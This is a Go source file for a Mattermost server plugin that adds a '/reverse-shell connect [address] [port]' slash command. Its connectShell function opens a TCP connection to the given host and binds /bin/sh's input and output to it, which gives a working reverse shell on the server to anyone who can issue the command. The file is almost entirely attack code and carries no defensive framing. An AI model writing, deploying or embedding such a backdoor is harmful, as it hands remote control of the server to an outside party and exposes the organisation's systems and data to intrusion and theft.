package main

import (
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/mattermost/mattermost-server/v6/plugin"

	"github.com/mattermost/mattermost-server/v6/model"
)

const (
	actionConnect = "connect"
)

func (p *Plugin) getCommand() (*model.Command, error) {
	return &model.Command{
		Trigger:          "reverse-shell",
		AutoComplete:     true,
		AutoCompleteDesc: "Available commands: connect",
		AutoCompleteHint: "[command]",
		AutocompleteData: p.getAutoCompleteData(),
	}, nil
}

func (p *Plugin) getAutoCompleteData() *model.AutocompleteData {
	reverseShell := model.NewAutocompleteData("reverse-shell",
		"[command]",
		"Available commands: connect")
	connect := model.NewAutocompleteData(actionConnect,
		"[address] [port]", "Shell listener address and port")
	connect.AddStaticListArgument("address", true, []model.AutocompleteListItem{
		{HelpText: "Address", Item: "address"},
		{HelpText: "Port", Item: "port"},
	})
	reverseShell.AddCommand(connect)
	return reverseShell
}

func (p *Plugin) ExecuteCommand(c *plugin.Context, args *model.CommandArgs) (*model.CommandResponse, *model.AppError) {
	_, err := p.executeCommand(c, args)
	if err != nil {
		p.API.LogWarn("failed to execute command", "error", err.Error())
	}
	return &model.CommandResponse{}, nil
}

func (p *Plugin) executeCommand(c *plugin.Context, args *model.CommandArgs) (string, error) {
	split := strings.Fields(args.Command)
	if len(split) != 4 {
		return "Invalid number of arguments", nil
	}
	command := split[1]
	if command != actionConnect {
		return fmt.Sprintf("Unknown command %v", command), nil
	}
	address := split[2]
	port, parseErr := strconv.Atoi(split[3])
	if parseErr != nil || !(port > 0 && port <= 65535) {
		return "Port must be a integer between 1 and 65535", nil
	}
	return "", p.connectShell(address, port)
}

func (p *Plugin) connectShell(address string, port int) error {
	host := fmt.Sprintf("%s:%d", address, port)
	c, err := net.Dial("tcp", host)

	if err != nil {
		return err
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	err = cmd.Run()
	if err != nil {
		return err
	}
	c.Close()
	return nil
}
